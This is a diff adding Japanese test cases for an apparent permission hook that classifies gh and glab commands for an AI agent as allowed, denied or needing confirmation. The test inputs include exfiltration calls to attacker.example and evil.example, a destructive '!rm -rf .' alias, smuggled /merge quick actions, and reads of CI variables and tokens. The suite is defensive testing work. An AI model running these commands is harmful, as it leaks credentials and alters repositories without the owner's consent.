+gh codespace ports forwardを渡すと、手元のポートで待ち受けるので止める。	gh codespace ports forward 80:80 -c x	-	deny	-	手元のポートへ転送
+別名のcsのgh cs ports forwardを渡すと、止める。	gh cs ports forward 80:80 -c x	-	deny	-	手元のポートへ転送
+gh repo cloneを渡すと、外のgit cloneが固定したgitのフォルダーに合わないので止める。	gh repo clone a/b	-	deny	-	already exists
+gh repo forkを渡すと、止める。	gh repo fork a/b	-	deny	-	already exists
+gh gist cloneを渡すと、止める。	gh gist clone 1	-	deny	-	already exists
+--cloneを付けたgh repo createを渡すと、止める。	gh repo create a/b --private --clone	-	deny	-	already exists
+短い形の-cを付けたgh repo createを渡すと、止める。	gh repo create a/b --private -c	-	deny	-	already exists
+--clone=の形のgh repo createを渡すと、止める。	gh repo create a/b --private --clone=true	-	deny	-	already exists
+gh repo syncを渡すと、git pullと同じく手元のブランチを外で書き換えるので止め、リモートを決めない代わりの手順を示す。	gh repo sync	-	deny	-	git merge --ff-only <リモート>/<ブランチ>
+二重引用符の中の変数を含むgh api graphqlを渡すと、止める。	gh api graphql -f query="${query}"	-	deny
+先頭に環境変数を付けたghを渡すと、止める。	GH_TOKEN=x gh pr view 1	-	deny
+&&でつないだghを渡すと、止める。	gh pr view 1 && gh pr merge 1	-	deny
+知らないオプションを付けたgh apiを渡すと、止める。	gh api --unknown repos/a/b	-	deny
+--body-fileを付けたgh pr createを渡すと、止める。	gh pr create --title x --body-file body.md	-	deny	-	（--body-file）
+--body-file=の形のgh pr editを渡すと、止める。	gh pr edit 12 --body-file=body.md	-	deny	-	（--body-file=body.md）
+短い形の-Fを付けたgh pr commentを渡すと、止める。	gh pr comment 12 -F c.md	-	deny	-	短い形（-F）
+--notes-fileを付けたgh release createを渡すと、止める。	gh release create v1 --notes-file notes.md	-	deny	-	（--notes-file）
+--from-fileを付けたgh agent-task createを渡すと、止める。	gh agent-task create --from-file task.md	-	deny	-	（--from-file）
+--env-fileを付けたgh secret setを渡すと、止める。	gh secret set --env-file .env	-	deny	-	（--env-file）
+--editorを付けたgh issue createを渡すと、止める。	gh issue create --editor	-	deny	-	（--editor）
+短い形の-eを付けたgh pr commentを渡すと、止める。	gh pr comment 12 -e	-	deny	-	短い形（-e）
+--recoverを付けたgh pr createを渡すと、止める。	gh pr create --recover input.json	-	deny	-	（--recover）
+--fillを付けたgh pr createを渡すと、止める。	gh pr create --fill	-	deny	-	（--fill）
+--fill-firstを付けたgh pr createを渡すと、止める。	gh pr create --fill-first	-	deny	-	（--fill-first）
+--fill-verboseを付けたgh pr createを渡すと、止める。	gh pr create --fill-verbose	-	deny	-	（--fill-verbose）
+短い形の-fを付けたgh pr createを渡すと、止める。	gh pr create -f	-	deny	-	短い形（-f）
+--templateを付けたgh pr createを渡すと、止める。	gh pr create --title x --template t.md	-	deny	-	（--template）
+短い形の-Tを付けたgh issue createを渡すと、止める。	gh issue create --title x -T bug	-	deny	-	短い形（-T）
+-fが別の意味のgh label createでも、短い形の-fを渡すと、止める。	gh label create x -f	-	deny	-	長い形
+値が@で始まる--fieldを付けたgh workflow runを渡すと、止める。	gh workflow run ci.yml --field x=@input.txt	-	deny	-	ファイルか標準入力から読んで
+値が@で始まる--field=の形のgh workflow runを渡すと、止める。	gh workflow run ci.yml --field=x=@input.txt	-	deny	-	ファイルか標準入力から読んで
+束ねた短い形を含むgh pr createを渡すと、止める。	gh pr create -dF body.md	-	deny	-	束ねた短い形
+値をつないだ短い形を含むgh pr commentを渡すと、止める。	gh pr comment 12 -bok	-	deny	-	束ねた短い形
+ファイルから値を読む-Fを付けたgh apiを渡すと、止める。	gh api repos/a/b/pulls/1/comments/2/replies -F body=@reply.md	-	deny	-	ファイルか標準入力から読んで
+標準入力から値を読む-Fを付けたgh apiを渡すと、止める。	gh api repos/a/b/issues -F body=@-	-	deny	-	ファイルか標準入力から読んで
+-Fと値をつないで@で始まる値を読むgh apiを渡すと、止める。	gh api repos/a/b/issues -Fbody=@x.md	-	deny	-	ファイルか標準入力から読んで
+--fieldで@で始まる値を読むgh apiを渡すと、止める。	gh api repos/a/b/issues --field body=@x.md	-	deny	-	ファイルか標準入力から読んで
+--field=で@で始まる値を読むgh apiを渡すと、止める。	gh api repos/a/b/issues --field=body=@x.md	-	deny	-	ファイルか標準入力から読んで
+ファイルから問い合わせを読むgh api graphqlを渡すと、止める。	gh api graphql -F query=@query.graphql	-	deny	-	ファイルか標準入力から読んで
+ghが置き換える:repoを-Fの値に含むgh apiを渡すと、止める。	gh api repos/a/b/pulls/1/reviews -F 'comments[][body]=see repos/:owner/:repo'	-	deny	-	置き換える語
+ghが置き換える{branch}を-Fの値に含むgh apiを渡すと、止める。	gh api repos/a/b/issues -F 'body=on {branch}'	-	deny	-	置き換える語
+ghが置き換える{owner}を--fieldの値に含むgh workflow runを渡すと、止める。	gh workflow run ci.yml --field 'x={owner}'	-	deny	-	置き換える語
+--inputを付けたgh apiを渡すと、止める。	gh api repos/a/b/issues --input issue.json	-	deny	-	（--input）
+--input=の形のgh apiを渡すと、止める。	gh api repos/a/b/issues --input=issue.json	-	deny	-	（--input=issue.json）
+# ghで確認を求めるもの
+--webを付けたgh pr viewを渡すと、ブラウザーを開くので確認を求める。	gh pr view 1 --web	-	ask	-	ブラウザー
+-wを付けたgh repo viewを渡すと、確認を求める。	gh repo view -w	-	ask	-	ブラウザー
+-cと-wを1語に束ねたgh pr viewを渡すと、確認を求める。	gh pr view 1 -cw	-	ask	-	ブラウザー
+--web=trueを付けたgh issue listを渡すと、確認を求める。	gh issue list --web=true	-	ask	-	ブラウザー
+--workflowの短い形の-wを付けたgh run listを渡すと、確認を求め、-wがブラウザーを開かない例外を理由の文に書く。	gh run list -w ci.yml	-	ask	-	gh run listだけは--workflow
+ほかのホストのURLと--webを付けたgh pr viewを渡すと、確認を求め、ほかのホストを理由の文に書く。	gh pr view https://ghe.example.com/a/b/pull/1 --web	-	ask	-	GitHubのほかのホスト
+ほかのホストの形に当たるパスと--webを付けたgh workflow viewを渡すと、確認を求め、ブラウザーも理由の文に書く。	gh workflow view .github/workflows/ci.yml --web	-	ask	-	ブラウザー
+gh pr createを渡すと、確認を求める。	gh pr create --title x --body 'x'	-	ask
+gh pr commentを渡すと、確認を求める。	gh pr comment 12 --body 'x'	-	ask
+引用符と改行を含む本文を値に書いたgh pr createを渡すと、確認を求める。	gh pr create --title x --body 'it'"'"'s ok\n- [ ] /merge'	-	ask
+ファイルを渡すgh gist createを渡すと、確認を求め、外のghがファイルを読めることを理由の文に書く。	gh gist create notes.md	-	ask	-	読めなくしたファイル
+--templateを付けたgh repo createを渡すと、確認を求める。	gh repo create a/b --private --template c/d	-	ask
+値をそのまま書く--fieldを付けたgh workflow runを渡すと、確認を求める。	gh workflow run ci.yml --field x=y	-	ask
+gh pr mergeを渡すと、確認を求める。	gh pr merge 12	-	ask
+gh pr checkoutを渡すと、確認を求め、導入先のフックとgitの設定のコマンドが外で動くことを理由の文に書く。	gh pr checkout 12	-	ask	-	gitの設定のコマンド（例：core.sshCommand、core.fsmonitor）も
+gh issue createを渡すと、確認を求める。	gh issue create --title x --body 'x'	-	ask
+手元に書くgh release downloadを渡すと、確認を求め、書かせないパスにも書けることを理由の文に書く。	gh release download v1 --dir .claude	-	ask	-	書かせないパス
+別名かもしれない知らないコマンドを渡すと、確認を求め、別名と拡張のことを理由の文に書く。	gh co 1	-	ask	-	利用者の別名
+gh alias deleteを渡すと、確認を求める。	gh alias delete pv	-	ask
+--cloneの無いgh repo createを渡すと、確認を求める。	gh repo create a/b --private	-	ask
+--methodを付けたgh apiを渡すと、確認を求める。	gh api repos/a/b/pulls/1/reviews --method POST -f event=COMMENT	-	ask
+-Xを付けたgh apiを渡すと、確認を求める。	gh api -X DELETE repos/a/b/git/refs/heads/x	-	ask
+-Xと値をつないだgh apiを渡すと、確認を求める。	gh api -XPATCH repos/a/b	-	ask
+-fを付けたgh apiのRESTを渡すと、確認を求める。	gh api repos/a/b/issues -f title=x	-	ask
+-fと値をつないだgh apiのRESTを渡すと、確認を求める。	gh api repos/a/b/issues -ftitle=x	-	ask
+@で始まる値を-fでそのまま送るgh apiを渡すと、確認を求める。	gh api repos/a/b/issues -f body=@x.md	-	ask
+配列のほかを-fで、配列の中のオブジェクトを-Fで送るgh apiを渡すと、確認を求める。	gh api repos/a/b/pulls/1/reviews -f commit_id=abc -f event=COMMENT -f 'body=see :repo' -F 'comments[][path]=a.md' -F 'comments[][line]=3' -F 'comments[][side]=RIGHT' -F 'comments[][body]=x'	-	ask
+mutationを含むgh api graphqlを渡すと、確認を求める。	gh api graphql -f query='mutation{resolveReviewThread(input:{threadId:"x"}){thread{id}}}'	-	ask
+--hostnameでほかのホストを指すgh apiを渡すと、確認を求める。	gh api --hostname attacker.example repos/x/y/contents/abc	-	ask
+--hostname=でほかのホストを指すgh apiを渡すと、確認を求める。	gh api --hostname=attacker.example user	-	ask
+ほかのホストのURLを丸ごと渡すgh apiを渡すと、確認を求める。	gh api 'https://attacker.example/collect?data=abc'	-	ask
+-RのHOST/OWNER/REPOでほかのホストを指すgh pr viewを渡すと、確認を求める。	gh pr view 1 -R attacker.example/a/b	-	ask
+ほかのホストのURLを渡すgh pr viewを渡すと、確認を求める。	gh pr view https://attacker.example/a/b/pull/1	-	ask
+# glabで通すもの
+glab mr viewを渡すと、通す。	glab mr view 12	-	allow
+-Rと-F jsonを付けたglab mr viewを渡すと、通す。	glab mr view 12 -R g/p -F json	-	allow
+-Rで入れ子のグループを指すglab mr viewを渡すと、通す。	glab mr view 12 -R g/sub/p	-	allow
+glab mr diffを渡すと、通す。	glab mr diff 12 --raw	-	allow
+@meを値にしたglab mr listを渡すと、通す。	glab mr list --assignee @me -P 100	-	allow
+隠したオプションの--mineを付けたglab mr listを渡すと、通す。	glab mr list --mine	-	allow
+glab ci getを渡すと、通す。	glab ci get --merge-request 12 -F json	-	allow
+glab ci listを渡すと、通す。	glab ci list -s failed	-	allow
+glab issue viewを渡すと、通す。	glab issue view 9 -c	-	allow
+空白を含む検索の語を付けたglab issue listを渡すと、通す。	glab issue list -l bug --search 'fix login'	-	allow
+glab label listを渡すと、通す。	glab label list -P 100	-	allow
+.を含むタグのglab release viewを渡すと、通す。	glab release view v1.0.0	-	allow
+glab release listを渡すと、通す。	glab release list	-	allow
+引数の無いglab auth statusを渡すと、通す。	glab auth status	-	allow
+引数の無いglab versionを渡すと、通す。	glab version	-	allow
+glab api userを渡すと、通す。	glab api user	-	allow
+決まった問い合わせの引数を付けたMRのdiscussionsのglab apiを渡すと、通す。	glab api 'projects/g%2Fp/merge_requests/12/discussions?per_page=100&page=2'	-	allow
+入れ子のグループのMRのnotesを--paginateで読むglab apiを渡すと、通す。	glab api --paginate projects/g%2Fsub%2Fp/merge_requests/12/notes	-	allow
+1つのdiscussionを読むglab apiを渡すと、通す。	glab api projects/g%2Fp/merge_requests/1/discussions/0123456789abcdef0123456789abcdef01234567	-	allow
+unidiffを付けたMRのversionを読むglab apiを渡すと、通す。	glab api 'projects/g%2Fp/merge_requests/12/versions/3?unidiff=true'	-	allow
+MRのdraft_notesを読むglab apiを渡すと、通す。	glab api projects/g%2Fp/merge_requests/1/draft_notes	-	allow
+MRそのものを読むglab apiを渡すと、通す。	glab api projects/g%2Fp/merge_requests/12	-	allow
+MRのパイプラインを--paginateで読むglab apiを渡すと、通す。	glab api --paginate projects/g%2Fsub%2Fp/merge_requests/12/pipelines	-	allow
+1つのnoteを読むglab apiを渡すと、通す。	glab api projects/g%2Fp/merge_requests/12/notes/34	-	allow
+決まった問い合わせの引数を付けたMRのversionsを読むglab apiを渡すと、通す。	glab api 'projects/g%2Fp/merge_requests/12/versions?per_page=100'	-	allow
+1つのdraft_noteを読むglab apiを渡すと、通す。	glab api projects/g%2Fp/merge_requests/1/draft_notes/3	-	allow
+パイプラインのjobsを読むglab apiを渡すと、通す。	glab api 'projects/g%2Fp/pipelines/5/jobs?scope=failed'	-	allow
+保護したブランチを検索するglab apiを渡すと、通す。	glab api 'projects/g%2Fp/protected_branches?search=release'	-	allow
+決まった問い合わせのglab api graphqlを渡すと、通す。	glab api graphql -f query='query($fullPath: ID!) { project(fullPath: $fullPath) { visibility ciConfigPathOrDefault } }' -f fullPath=g/sub/p	-	allow
+# glabで止めるもの
+引数の無いglabを渡すと、止める。	glab	-	deny	-	コマンドがありません
+glabの直後にオプションを置いたコマンドを渡すと、止める。	glab -R g/p mr list	-	deny	-	glabの直後に
+--を含むglabを渡すと、止める。	glab mr list -- -x	-	deny	-	「--」
+束ねた短い形を含むglab mr createを渡すと、止める。	glab mr create -yf --title x	-	deny	-	束ねた短い形
+値を=でつないだ短い形を含むglabを渡すと、止める。	glab mr view 12 -R=g/p	-	deny	-	束ねた短い形
+値をつないだ短い形を含むglabを渡すと、止める。	glab mr view 12 -Rg/p	-	deny	-	束ねた短い形
+--with-variablesを付けたglab ci getを渡すと、止める。	glab ci get --with-variables	-	deny	-	（--with-variables）
+--with-variables=trueを付けたglab ci getを渡すと、止める。	glab ci get --with-variables=true	-	deny	-	（--with-variables=true）
+別名のglab ci statsに--with-variablesを付けて渡すと、止める。	glab ci stats --with-variables	-	deny	-	（--with-variables）
+--fillを付けたglab mr createを渡すと、止める。	glab mr create --fill --title x	-	deny	-	（--fill）
+--fill-commit-bodyを付けたglab mr createを渡すと、止める。	glab mr create --title x --fill-commit-body	-	deny	-	（--fill-commit-body）
+--pushを付けたglab mr createを渡すと、止める。	glab mr create --title x -d y --push	-	deny	-	（--push）
+--description-fileを付けたglab mr createを渡すと、止める。	glab mr create --title x --description-file body.md	-	deny	-	（--description-file）
+--templateを付けたglab mr createを渡すと、止める。	glab mr create --title x --template bug	-	deny	-	（--template）
+--recoverを付けたglab mr createを渡すと、止める。	glab mr create --title x --recover	-	deny	-	（--recover）
+--attachを付けたglab issue noteを渡すと、止める。	glab issue note 3 -m x --attach a.png	-	deny	-	（--attach）
+--inputを付けたglab apiを渡すと、止める。	glab api projects/g%2Fp/issues --input issue.json	-	deny	-	（--input）
+--formを付けたglab apiを渡すと、止める。	glab api projects/g%2Fp/uploads --form file=@a.png	-	deny	-	（--form）
+--no-verifyを付けたglab stack saveを渡すと、止める。	glab stack save -m x --no-verify	-	deny	-	（--no-verify）
+本文が-のglab mr createを渡すと、止める。	glab mr create --title x -d -	-	deny	-	エディターか標準入力
+本文が空白だけのglab mr createを渡すと、止める。	glab mr create --title x -d ' '	-	deny	-	エディターか標準入力
+本文が空の--description=のglab mr updateを渡すと、止める。	glab mr update 3 --description=	-	deny	-	エディターか標準入力
+行の頭が/の行を本文に含むglab mr createを渡すと、止める。	glab mr create --title x -d 'see\n/merge'	-	deny	-	クイックアクション
+前に空白のある/の行を本文に含むglab mr createを渡すと、止める。	glab mr create --title x --description 'ok\n  /approve'	-	deny	-	クイックアクション
+復帰の文字のあとに/がある本文のglab mr createを渡すと、止める。	glab mr create --title x -d 'ok\r/merge'	-	deny	-	クイックアクション
+/で始まる本文のglab issue noteを渡すと、止める。	glab issue note 3 -m '/close'	-	deny	-	クイックアクション
+-mがマイルストーンのglab mr listでも、/で始まる値を渡すと、止める。	glab mr list -m '/x'	-	deny	-	クイックアクション
+2つ目の--messageの本文が/で始まるglab mr note createを渡すと、止める。	glab mr note create 12 -m ok --message '/merge'	-	deny	-	クイックアクション
+--message=の本文が/で始まるglab mr note createを渡すと、止める。	glab mr note create 12 '--message=/merge'	-	deny	-	クイックアクション
+/で始まる-fの値を送るglab apiを渡すと、止める。	glab api projects/g%2Fp/merge_requests/1/notes -f 'body=/merge'	-	deny	-	クイックアクション
+行の頭が/の行を含む-Fの値を送るglab apiを渡すと、止める。	glab api projects/g%2Fp/merge_requests/1/notes -F 'body=ok\n /merge'	-	deny	-	クイックアクション
+JSONの文字列が/で始まる-Fの値を送るglab apiを渡すと、止める。	glab api projects/g%2Fp/merge_requests/1/draft_notes -F 'position={"a": "/merge"}'	-	deny	-	JSONの値
+JSONに\を含む-Fの値を送るglab apiを渡すと、止める。	glab api projects/g%2Fp/merge_requests/1/draft_notes -F 'position={"a":"x\\n/merge"}'	-	deny	-	JSONの値
+問い合わせの引数の%XXを戻すと/の行になるglab apiを渡すと、止める。	glab api 'projects/g%2Fp/merge_requests/1/notes?body=x%0A%2Fmerge'	-	deny	-	クイックアクション
+ファイルから値を読む-Fを付けたglab apiを渡すと、止める。	glab api projects/g%2Fp/merge_requests/1/notes -F body=@reply.md	-	deny	-	ファイルから読んで
+ほかのホストのURLを丸ごと渡すglab apiを渡すと、止める。	glab api 'https://attacker.example/collect?d=1'	-	deny	-	URLの全体
+CI/CDの変数を読むglab apiを渡すと、止める。	glab api projects/g%2Fp/variables	-	deny	-	返すことがある
+プロジェクトだけを読むglab apiを渡すと、止める。	glab api projects/g%2Fp	-	deny	-	返すことがある
+グループだけを読むglab apiを渡すと、止める。	glab api groups/g	-	deny	-	返すことがある
+トリガーを読むglab apiを渡すと、止める。	glab api projects/g%2Fp/triggers	-	deny	-	返すことがある
+デプロイのトークンを読むglab apiを渡すと、止める。	glab api projects/g%2Fp/deploy_tokens	-	deny	-	返すことがある
+アクセストークンを読むglab apiを渡すと、止める。	glab api projects/g%2Fp/access_tokens	-	deny	-	返すことがある
+セキュアファイルを読むglab apiを渡すと、止める。	glab api projects/g%2Fp/secure_files/1/download	-	deny	-	返すことがある
+区切りの字を%XXで書いたglab apiを渡すと、止める。	glab api projects/g%2Fp/variabl%65s	-	deny	-	比べられない
+最後が/のglab apiを渡すと、止める。	glab api projects/g%2Fp/	-	deny	-	比べられない
+空の区切りのあるglab apiを渡すと、止める。	glab api projects//g%2Fp	-	deny	-	比べられない
+先頭が/のglab apiを渡すと、止める。	glab api /projects/g%2Fp	-	deny	-	比べられない
+プロジェクトのパスの/を小文字の%2fで書いたglab apiを渡すと、止める。	glab api projects/g%2fp/merge_requests/1	-	deny	-	比べられない
+--placeholderを付けたglab apiを渡すと、止める。	glab api --placeholder x=y user	-	deny	-	許すオプションに無い
+-hを付けたglab apiを渡すと、止める。	glab api -h	-	deny	-	許すオプションに無い
+エンドポイントが2つのglab apiを渡すと、止める。	glab api user projects	-	deny	-	エンドポイントが無いか
+エンドポイントの無いglab apiを渡すと、止める。	glab api --paginate	-	deny	-	エンドポイントが無いか
+決まっていない問い合わせのglab api graphqlを渡すと、止める。	glab api graphql -f query='{ project(fullPath: "g/p") { ciVariables { nodes { value } } } }'	-	deny	-	決まった問い合わせ
+決まった問い合わせにほかの値を足したglab api graphqlを渡すと、止める。	glab api graphql -f query='query($fullPath: ID!) { project(fullPath: $fullPath) { visibility ciConfigPathOrDefault } }' -f fullPath=g/p -f other=x	-	deny	-	決まった問い合わせ
+決まった問い合わせのfullPathが2つあるglab api graphqlを渡すと、止める。	glab api graphql -f query='query($fullPath: ID!) { project(fullPath: $fullPath) { visibility ciConfigPathOrDefault } }' -f fullPath=g/p -f fullPath=h/q	-	deny	-	決まった問い合わせ
+決まった問い合わせと空白が1つ違うglab api graphqlを渡すと、止める。	glab api graphql -f query='query($fullPath: ID!) {  project(fullPath: $fullPath) { visibility ciConfigPathOrDefault } }' -f fullPath=g/p	-	deny	-	決まった問い合わせ
+fullPathをファイルから読むglab api graphqlを渡すと、止める。	glab api graphql -f query='query($fullPath: ID!) { project(fullPath: $fullPath) { visibility ciConfigPathOrDefault } }' -F fullPath=@path.txt	-	deny	-	ファイルから読んで
+知らないglabのコマンドを渡すと、止める。	glab foo	-	deny	-	知らないコマンドか別名
+別名のglab mr showを渡すと、止める。	glab mr show 1	-	deny	-	知らないコマンドか別名
+別名のglab mr lsを渡すと、止める。	glab mr ls	-	deny	-	知らないコマンドか別名
+親の別名のglab var listを渡すと、止める。	glab var list	-	deny	-	知らないコマンドか別名
+サブコマンドの無いglab mrを渡すと、止める。	glab mr	-	deny	-	知らないコマンドか別名
+コマンドの名前の間に-Rを置いたglab mr noteを渡すと、止める。	glab mr note -R g/p create 12 -m x	-	deny	-	コマンドの名前の間に
+コマンドの名前の間に--repo=を置いたglab mr noteを渡すと、止める。	glab mr note --repo=g/p create 12 -m x	-	deny	-	コマンドの名前の間に
+-mの無いglab mr note createを渡すと、止める。	glab mr note create 12	-	deny	-	-mがありません
+-mの無いglab issue noteを渡すと、止める。	glab issue note 3	-	deny	-	-mがありません
+-mの無いglab mr note updateを渡すと、止める。	glab mr note update 12 5	-	deny	-	-mがありません
+-fを付けたglab mr createを渡すと、止める。	glab mr create --title x -d y -f	-	deny	-	-fは--fill
+-fを付けたglab mr updateを渡すと、止める。	glab mr update 3 -f	-	deny	-	-fは--fill
+番号の無いglab mr mergeを渡すと、今のブランチから対象を決めるので止める。	glab mr merge	-	deny	-	コマンドの名前のすぐ後ろ
+ブランチの名前で対象を書いたglab mr mergeを渡すと、止める。	glab mr merge feat/x	-	deny	-	コマンドの名前のすぐ後ろ
+番号の前に-Rを置いたglab mr mergeを渡すと、止める。	glab mr merge -R g/p 3	-	deny	-	コマンドの名前のすぐ後ろ
+番号の無いglab mr approveを渡すと、止める。	glab mr approve	-	deny	-	コマンドの名前のすぐ後ろ
+番号の無いglab mr closeを渡すと、止める。	glab mr close --yes	-	deny	-	コマンドの名前のすぐ後ろ
+番号の無いglab mr updateを渡すと、止める。	glab mr update --title x	-	deny	-	コマンドの名前のすぐ後ろ
+--source-branchの無いglab mr createを渡すと、止める。	glab mr create --title x -d y --target-branch main	-	deny	-	--source-branch
+--source-branchをほかのオプションの後ろに書いたglab mr createを渡すと、止める。	glab mr create --title x -d y --source-branch feat/x	-	deny	-	--source-branch
+--source-branchを本文の値にしたglab mr createを渡すと、止める。	glab mr create -d --source-branch --title x	-	deny	-	--source-branch
+値の無い--source-branch=のglab mr createを渡すと、止める。	glab mr create --source-branch= --title x -d y	-	deny	-	--source-branch
+--source-branchの値がオプションのglab mr createを渡すと、止める。	glab mr create --source-branch --title x -d y	-	deny	-	--source-branch
+glab repo cloneを渡すと、止める。	glab repo clone g/p	-	deny	-	clone
+glab repo forkを渡すと、止める。	glab repo fork g/p	-	deny	-	clone
+-tを付けたglab auth statusを渡すと、止める。	glab auth status -t	-	deny	-	引数を付けずに
+--hostnameを付けたglab auth statusを渡すと、止める。	glab auth status --hostname gitlab.com	-	deny	-	引数を付けずに
+引数を付けたglab versionを渡すと、止める。	glab version --help	-	deny	-	引数を付けずに
+glab auth loginを渡すと、止める。	glab auth login	-	deny	-	トークンか秘密の値
+glab config getを渡すと、止める。	glab config get token	-	deny	-	トークンか秘密の値
+glab variable listを渡すと、止める。	glab variable list	-	deny	-	トークンか秘密の値
+glab token createを渡すと、止める。	glab token create x	-	deny	-	トークンか秘密の値
+glab cluster agent get-tokenを渡すと、止める。	glab cluster agent get-token	-	deny	-	トークンか秘密の値
+glab securefile downloadを渡すと、止める。	glab securefile download 1	-	deny	-	トークンか秘密の値
+シェルの別名を作るglab alias setを渡すと、止める。	glab alias set x '!rm -rf .'	-	deny	-	サンドボックスの外で動かすか
+glab minder setupを渡すと、止める。	glab minder setup	-	deny	-	サンドボックスの外で動かすか
+glab duo cliを渡すと、止める。	glab duo cli	-	deny	-	サンドボックスの外で動かすか
+glab minder audit syncを渡すと、止める。	glab minder audit sync	-	deny	-	手元のファイルか記録
+glab stack syncを渡すと、止める。	glab stack sync	-	deny	-	pushの判定を通らない
+glab repo viewを渡すと、止める。	glab repo view g/p	-	deny	-	runners_token
+先頭に環境変数を付けたglabを渡すと、止める。	GITLAB_HOST=x glab mr list	-	deny	-	、glabではない
+&&でつないだglabを渡すと、止める。	glab mr view 1 && glab mr merge 1	-	deny
+# glabで確認を求めるもの
+--descriptionの本文で作るglab mr createを渡すと、確認を求める。	glab mr create --source-branch feat/x --title x --description 'body' --target-branch main --yes	-	ask	-	リモートへの書き込み
+rules/git.mdの形（--source-branchの後ろに-R）のglab mr createを渡すと、確認を求め、ほかのホストとは示さない。	glab mr create --source-branch feat/x -R g/sub/p --title x --description 'body' --target-branch main --yes	-	ask	-	!ほかのホスト
+--push=falseを付けたglab mr createを渡すと、確認を求める。	glab mr create --source-branch feat/x --title x -d y --push=false	-	ask	-	リモートへの書き込み
+-sで送り元のブランチを書いたglab mr createを渡すと、確認を求める。	glab mr create -s feat/x --title x -d y	-	ask	-	リモートへの書き込み
+--source-branch=で送り元のブランチを書いたglab mr createを渡すと、確認を求める。	glab mr create --source-branch=feat/x --title x -d y	-	ask	-	リモートへの書き込み
+番号を書いたglab mr approveを渡すと、確認を求める。	glab mr approve 12	-	ask	-	リモートへの書き込み
+番号のあとに-Rを書いたglab mr closeを渡すと、確認を求める。	glab mr close 12 -R g/p	-	ask	-	リモートへの書き込み
+glab mr note createを渡すと、確認を求める。	glab mr note create 12 -m 'LGTM'	-	ask	-	リモートへの書き込み
+glab issue noteを渡すと、確認を求める。	glab issue note 3 -m thanks	-	ask	-	リモートへの書き込み
+glab mr mergeを渡すと、確認を求める。	glab mr merge 3	-	ask	-	リモートへの書き込み
+glab mr checkoutを渡すと、確認を求め、gitのfetchとcheckoutが外で動くことを理由の文に書く。	glab mr checkout 12	-	ask	-	fetchとcheckout
+glab ci viewを渡すと、確認を求める。	glab ci view	-	ask	-	画面かブラウザー
+glab ci traceを渡すと、確認を求める。	glab ci trace 5	-	ask	-	画面かブラウザー
+glab ci statusを渡すと、確認を求める。	glab ci status	-	ask	-	画面かブラウザー
+glab release downloadを渡すと、確認を求める。	glab release download v1 --dir x	-	ask	-	手元のファイルかgitを書き換える
+glab snippet createを渡すと、確認を求める。	glab snippet create a.txt --title x	-	ask	-	手元のファイルを読んで
+-wを付けたglab mr viewを渡すと、確認を求める。	glab mr view 12 -w	-	ask	-	ブラウザーを開く
+--webを付けたglab issue viewを渡すと、確認を求める。	glab issue view 3 --web	-	ask	-	ブラウザーを開く
+許すオプションの一覧に無いオプションを付けたglab mr viewを渡すと、確認を求める。	glab mr view 12 --color always	-	ask	-	許すオプションの一覧に無い
+本文の途中にURLのあるglab mr note createを渡すと、確認を求め、ほかのホストとは示さない。	glab mr note create 1 -m 'see https://example.invalid/x' -R g/p	-	ask	-	!ほかのホスト
+-Rの値がURLのglab mr note createを渡すと、確認を求め、ほかのホストと示す。	glab mr note create 1 -m x -R https://evil.example/g/p	-	ask	-	ほかのホスト
+-Rでほかのホストを指すglab mr viewを渡すと、確認を求める。	glab mr view 1 -R evil.example/g/p	-	ask	-	ほかのホスト
+-Rでポートの付いたホストを指すglab mr viewを渡すと、確認を求める。	glab mr view 1 -R evil.example:8443/g/p	-	ask	-	ほかのホスト
+-Rにgitのリモートの形を渡すglab mr listを渡すと、確認を求める。	glab mr list -R git@evil.example:g/p.git	-	ask	-	ほかのホスト
+-RにURLを渡すglab mr viewを渡すと、確認を求める。	glab mr view 1 -R https://evil.example/g/p	-	ask	-	ほかのホスト
+--repo=でほかのホストを指すglab mr viewを渡すと、確認を求める。	glab mr view 1 --repo=evil.example/g/p	-	ask	-	ほかのホスト
+引数にほかのホストのURLを渡すglab mr viewを渡すと、確認を求める。	glab mr view https://evil.example/g/p/-/merge_requests/1	-	ask	-	ほかのホスト
+引数にスキームの無いURLを渡すglab mr viewを渡すと、確認を求める。	glab mr view //evil.example/g/p/-/merge_requests/1	-	ask	-	ほかのホスト
+/で始まる引数を渡すglab mr diffを渡すと、確認を求める。	glab mr diff /g/p	-	ask	-	ほかのホスト
+@を含む引数を渡すglab issue viewを渡すと、確認を求める。	glab issue view 'a@b'	-	ask	-	ほかのホスト
+値を取らない短い形のあとの-Rでほかのホストを指すglab mr listを渡すと、確認を求める。	glab mr list -c -R evil.example/g/p	-	ask	-	ほかのホスト
+値を取らない短い形のあとにスキームの無いURLを置いたglab mr listを渡すと、確認を求める。	glab mr list -c //evil.example/g/p	-	ask	-	ほかのホスト
+2つ目の-Rでほかのホストを指すglab mr listを渡すと、確認を求める。	glab mr list -R g/p -R evil.example/g/p	-	ask	-	ほかのホスト
+-Rでほかのホストを指すglab mr note createを渡すと、確認を求め、ほかのホストのことも書く。	glab mr note create 1 -m ok -R evil.example/g/p	-	ask	-	ほかのホスト
+-Xを付けたglab apiを渡すと、確認を求める。	glab api -X GET user	-	ask	-	メソッド、ヘッダー
+--hostnameを付けたglab apiを渡すと、確認を求める。	glab api --hostname evil.example user	-	ask	-	メソッド、ヘッダー
+-Rを付けたglab apiを渡すと、確認を求める。	glab api -R g/p user	-	ask	-	メソッド、ヘッダー
+-Hを付けたglab apiを渡すと、確認を求める。	glab api -H 'Sudo: root' user	-	ask	-	メソッド、ヘッダー
+-Rを付けた決まった問い合わせのglab api graphqlを渡すと、確認を求める。	glab api graphql -R g/p -f query='query($fullPath: ID!) { project(fullPath: $fullPath) { visibility ciConfigPathOrDefault } }' -f fullPath=g/p	-	ask	-	メソッド、ヘッダー
+-fで値を送るglab apiを渡すと、確認を求める。	glab api projects/g%2Fp/merge_requests/1/notes -f body=ok	-	ask	-	POST
+ジョブのログを読むglab apiを渡すと、確認を求める。	glab api projects/g%2Fp/jobs/5/trace	-	ask	-	確認なしで読む一覧に無い
+許さない問い合わせの引数を付けたglab apiを渡すと、確認を求める。	glab api 'user?sudo=root'	-	ask	-	確認なしで読む一覧に無い
+上限を超えるper_pageのglab apiを渡すと、確認を求める。	glab api 'projects/g%2Fp/merge_requests/1/notes?per_page=101'	-	ask	-	確認なしで読む一覧に無い
+..の区切りを含むglab apiを渡すと、確認を求める。	glab api projects/g%2Fp/merge_requests/1/notes/..	-	ask	-	確認なしで読む一覧に無い
+プロジェクトのパスに..を含むglab apiを渡すと、確認を求める。	glab api projects/g%2F..%2Fp/merge_requests/1	-	ask	-	確認なしで読む一覧に無い
